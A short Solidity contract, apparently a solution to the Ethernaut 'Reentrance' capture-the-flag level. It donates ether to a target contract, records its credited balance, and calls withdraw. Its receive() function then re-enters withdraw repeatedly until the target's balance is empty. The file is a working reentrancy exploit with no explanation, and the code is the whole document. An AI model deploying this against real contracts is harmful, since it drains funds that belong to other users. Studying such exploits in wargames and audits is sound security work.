// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

error CallFailed(string methodName);

interface ITarget {
    function donate(address to) external payable;

    function balanceOf(address who) external view returns (uint256);

    function withdraw(uint256 amount) external;
}

contract Reentrance {
    address public immutable i_target;
    uint256 public s_amount;

    constructor(address target) {
        i_target = target;
    }

    function drop(uint256 amount) public {
        ITarget(i_target).donate{value: amount}(address(this));
    }

    function setAmount() public {
        s_amount = ITarget(i_target).balanceOf(address(this));
    }

    function pwn() public {
        ITarget(i_target).withdraw(s_amount);
    }

    receive() external payable {
        if (address(i_target).balance > 0) pwn();
    }
}
